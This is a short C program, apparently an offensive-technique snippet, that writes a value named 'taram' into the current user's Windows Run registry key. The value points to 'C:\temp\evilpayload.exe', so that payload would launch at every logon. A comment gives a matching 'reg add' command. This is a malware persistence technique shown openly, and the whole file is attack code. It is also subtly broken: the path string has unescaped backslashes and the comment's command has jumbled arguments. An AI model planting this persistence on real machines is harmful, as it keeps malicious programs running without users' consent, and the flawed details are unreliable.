// This code try to access and modify the registry using various Windows API functions
// LIKE THE CMD COMMAND LINE: reg add HKLM... /d evilpayload /t REG_SZ /v C:\temp
/*

LSTATUS RegCreateKeyExA(
  [in]            HKEY                        hKey,
  [in]            LPCSTR                      lpSubKey,
                  DWORD                       Reserved,
  [in, optional]  LPSTR                       lpClass,
  [in]            DWORD                       dwOptions,
  [in]            REGSAM                      samDesired,
  [in, optional]  const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  [out]           PHKEY                       phkResult,
  [out, optional] LPDWORD                     lpdwDisposition
);
https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
*/

#include <windows.h>
#include <string.h>

int main(){
  
  HKEY hnewkey = NULL;
  const char* evilpayload = "C:\temp\evilpayload.exe";
  LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hnewkey);
  RegSetValueEx(hnewkey, (LPCSTR)"taram", 0, REG_SZ, (unsigned char*)evilpayload, strlen(evilpayload));
  RegCloseKey(hnewkey);
  return 0;
  
}
